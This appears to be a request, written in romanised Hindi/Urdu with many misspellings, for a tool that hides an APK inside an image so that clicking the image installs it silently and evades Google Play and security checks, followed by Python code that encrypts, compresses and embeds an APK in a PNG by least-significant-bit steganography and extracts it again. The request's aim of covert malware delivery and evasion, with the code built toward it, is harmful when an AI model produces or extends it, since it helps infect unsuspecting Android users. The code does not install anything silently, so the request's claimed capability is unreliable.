fttttMa es tool ko mazed powerful hu apk bindeng ka duran sign kare ourjasa image pa click karta hi silant install kare our apk ko google play sa ya our securty pakarna sa bachaye for educational parpasess

import zlib
from stegano import lsb
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64
import os
import sys
import hashlib

# AES Encryption and Decryption
def encrypt_payload(payload_data, key):
    cipher = AES.new(key, AES.MODE_EAX)
    nonce = cipher.nonce
    ciphertext, tag = cipher.encrypt_and_digest(payload_data)
    return base64.b64encode(nonce + tag + ciphertext)

def decrypt_payload(encrypted_data, key):
    raw_data = base64.b64decode(encrypted_data)
    nonce = raw_data[:16]
    tag = raw_data[16:32]
    ciphertext = raw_data[32:]
    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
    return cipher.decrypt_and_verify(ciphertext, tag)

# Function to compute the checksum
def compute_checksum(data):
    return hashlib.sha256(data).hexdigest()

# Function to hide payload in image
def hide_payload_advanced(image_path, apk_path, output_image, encryption_key):
    with open(apk_path, 'rb') as file:
        apk_data = file.read()

    # Compute checksum and compress APK data
    checksum = compute_checksum(apk_data)
    compressed_apk = zlib.compress(apk_data)

    # Encrypt and hide APK data in image
    encrypted_apk = encrypt_payload(compressed_apk, encryption_key)
    
    # Include checksum with the encrypted payload
    hidden_data = f"{checksum}:{encrypted_apk.decode('latin-1')}"
    
    secret_image = lsb.hide(image_path, hidden_data)
    secret_image.save(output_image)

# Function to extract APK from image
def extract_apk_advanced(image_path, encryption_key):
    hidden_data = lsb.reveal(image_path)
    
    if hidden_data is None:
        raise Exception("No hidden data found in the image.")
    
    # Split checksum and encrypted APK
    checksum, encrypted_apk = hidden_data.split(':')
    
    # Decrypt payload
    decrypted_apk = decrypt_payload(encrypted_apk.encode('latin-1'), encryption_key)

    # Decompress the APK
    apk_data = zlib.decompress(decrypted_apk)

    # Verify checksum
    if compute_checksum(apk_data) != checksum:
        raise Exception("Checksum does not match. The APK might be corrupted.")

    # Save the extracted APK to a file
    with open('extracted_payload.apk', 'wb') as file:
        file.write(apk_data)

    print("APK extracted successfully!")

# Example usage
if __name__ == "__main__":
    encryption_key = get_random_bytes(16)  # Generate a random 16 byte key
    hide_payload_advanced('image.png', 'your_app.apk', 'output_image.png', encryption_key)
    extract_apk_advanced('output_image.png', encryption_key)